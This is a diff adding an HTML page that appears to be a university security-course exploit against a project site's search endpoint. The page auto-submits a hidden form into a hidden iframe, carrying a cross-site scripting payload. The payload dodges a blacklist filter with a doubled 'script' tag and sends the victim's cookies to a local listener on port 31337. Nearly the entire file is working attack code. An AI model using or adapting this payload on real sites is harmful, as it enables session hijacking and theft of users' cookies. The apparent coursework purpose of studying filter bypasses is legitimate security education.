@@ -1,0 +1,35 @@
+<meta charset="utf-8">
+<!-- source : https://www.kirupa.com/html5/making_http_requests_js.htm !-->
+<!-- SOurce: http://michael-coates.blogspot.com/2008/06/cross-site-scripting-blacklist-vs.html !-->
+<!-- This HTML file was made by Konstantino Sparakis --!>
+
+
+
+<!-- Loading in jquery from a CDN, requires active internet connection!-->
+<script src="https://code.jquery.com/jquery-1.12.3.min.js" integrity="sha256-aaODHAgvwQW1bFOGXMeX+pC4PZIPsvn2h1sArYOhgXQ=" crossorigin="anonymous"></script>
+
+
+
+<!-- This form points to our target, post function, it is hidden and has our fake data, 
+by targeting out iframe we ensure that the page doesnt go to where the action is and it stays hidden.-->
+<form name="CSRF" target="hiddeniframe" method="get" action="http://cs558web.bu.edu/project2/search">
+    <input type="hidden" name="xssdefense" value="1">
+    <input type="hidden" name="q" value="">
+</form>
+
+<iframe name="hiddeniframe"></iframe>
+
+<script>
+    $(document).ready(function () {
+
+        //This is my payload string 
+        var st = "<scripscriptt> var xhr = new XMLHttpRequest();xhr.open('GET', '//127.0.0.1:31337/' + document.cookie, false);xhr.setRequestHeader('Connection', 'Close');xhr.send();xhr.abort();</scripscriptt>"
+
+        //Adding my payload to myform
+        $("input[name=q]").val(st);
+        //Submits the form
+        CSRF.submit();
+        //Hides the iframe from the users view
+        $("iframe[name=hiddeniframe]").hide();
+    });
+</script>
